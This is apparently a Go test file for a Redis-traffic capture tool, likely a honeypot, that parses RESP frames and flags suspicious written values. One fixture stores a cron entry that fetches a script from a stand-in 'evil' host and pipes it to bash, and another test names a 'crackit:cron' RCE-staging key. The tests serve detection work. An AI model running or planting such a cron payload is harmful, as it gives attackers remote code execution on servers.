package TCP

import "bytes"
import "testing"

func resp(args ...string) []byte {
	var b bytes.Buffer
	b.WriteString("*")
	b.WriteString(itoa(len(args)))
	b.WriteString("\r\n")
	for _, a := range args {
		b.WriteString("$")
		b.WriteString(itoa(len(a)))
		b.WriteString("\r\n")
		b.WriteString(a)
		b.WriteString("\r\n")
	}
	return b.Bytes()
}
func itoa(n int) string { // tiny helper to avoid strconv import churn in the test
	if n == 0 {
		return "0"
	}
	d := []byte{}
	for n > 0 {
		d = append([]byte{byte('0' + n%10)}, d...)
		n /= 10
	}
	return string(d)
}

func TestRedisWriteValue_Set(t *testing.T) {
	k, v, ok := redisWriteValue(resp("SET", "cron:job", "*/5 * * * * curl http://evil/x|bash"))
	if !ok || k != "cron:job" || string(v) != "*/5 * * * * curl http://evil/x|bash" {
		t.Fatalf("got key=%q val=%q ok=%v", k, v, ok)
	}
}
func TestRedisWriteValue_BinaryValuePreserved(t *testing.T) {
	payload := []byte{0x7f, 0x45, 0x4c, 0x46, 0x00, 0x01} // ELF-ish + NUL
	_, v, ok := redisWriteValue(resp("set", "k", string(payload)))
	if !ok || !bytes.Equal(v, payload) {
		t.Fatalf("binary value not preserved: %v ok=%v", v, ok)
	}
}
func TestRedisWriteValue_NonWriteIsFalse(t *testing.T) {
	if _, _, ok := redisWriteValue(resp("GET", "k")); ok {
		t.Fatal("GET must not be a write value")
	}
}
func TestRedisWriteValue_PartialFrameIsFalse(t *testing.T) {
	full := resp("SET", "k", "value")
	if _, _, ok := redisWriteValue(full[:len(full)-3]); ok {
		t.Fatal("truncated frame must return ok=false")
	}
}

func TestGate_SkipsSmallBenign(t *testing.T) {
	if shouldCaptureRedisValue("user:42:name", []byte("alice")) {
		t.Fatal("small printable benign value must not be captured")
	}
}
func TestGate_CapturesLarge(t *testing.T) {
	if !shouldCaptureRedisValue("k", bytes.Repeat([]byte("A"), 512)) {
		t.Fatal(">=512B value must be captured")
	}
}
func TestGate_CapturesBinary(t *testing.T) {
	if !shouldCaptureRedisValue("k", []byte{0x7f, 0x45, 0x4c, 0x46, 0x00}) {
		t.Fatal("binary value must be captured")
	}
}
func TestGate_CapturesStagingKey(t *testing.T) {
	if !shouldCaptureRedisValue("crackit:cron", []byte("short")) {
		t.Fatal("RCE-staging key must be captured even when small")
	}
}
